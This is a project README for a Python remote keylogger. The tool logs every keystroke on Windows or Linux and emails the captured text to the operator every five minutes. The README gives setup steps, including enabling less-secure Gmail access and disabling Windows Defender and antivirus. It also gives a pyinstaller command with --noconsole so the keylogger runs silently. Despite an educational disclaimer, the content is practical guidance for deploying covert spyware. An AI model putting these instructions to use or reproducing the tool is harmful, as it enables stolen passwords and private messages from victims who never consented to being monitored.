# Disclaimer 
This tool is for educational purposes only. To be used in your own network and labs, not for illegal activities. Use it on your own networks/labs/enviorments and/or with the consent of the network owner. The author and any other collaborators are not responsible for any misuse of this program.

This tool is open source, you can edit/modify/contribute to this tool.

# Description
This is a remote keylogger, one of many projects I am working on. This keylogger can run on Linux and windows, it logs all keystrokes and sends these recorded keystrokes to your email every 5 minutes (This can be edited). You can package this as an executable in Linux and Windows.

# Requirements 
Make sure you have pynput module and pyinstaller (for packaging) installed.

**You will also need to enable less secure apps access in your email.**

Preferably create a new fresh gmail account for this.

[Google Allow Less Secure Apps](https://support.google.com/accounts/answer/6010255?hl=en)


## PyInstaller

PyInstaller is available on PyPI. You can install it through pip.

>pip install pyinstaller
[Pyinstaller Documentation](https://pyinstaller.readthedocs.io/en/stable/)

## Pynput
> pip install pynput 
> 
For this to run make sure you disable windows defender and anti-virus

[Pynput Documentation](https://pynput.readthedocs.io/en/latest/)

# How to Use 

> python keeginlogarithm.py

![keylogger](https://user-images.githubusercontent.com/55252902/148361151-f3dd8e7d-6992-4e79-b2b7-ec8a191a7efc.JPG)


**MAKE SURE IN KEEGINLOGARITH.PY IN THE TWO EMPTY FIELDS "" "" TO ENTER YOUR EMAIL AND PASSWORD.**

**You can also specify the amount of time for the reports to be sent to yout email. I have it set to 300 which is 5 minutes.**

![keeginlogar](https://user-images.githubusercontent.com/55252902/148360538-cdf43792-68ef-48db-9574-9cbcf33e36f1.JPG)


# Packaging 

pyinstaller keeginlogaritm.py --onefile --noconsole

—onefile | Create a one-file bundled executable.

—noconsole | Windows and Mac OS X: do not provide a console window for standard i/o. On Mac OS this also triggers building a Mac OS .app bundle. On Windows this option is automatically set if the first script is a ‘.pyw’ file. This option is ignored on *NIX systems. | Use this to silently run programs.

**REMEMBER TO MAKE SURE ANTI-VIRUS AND WINDOWS DEFENDER IS DISABLED**




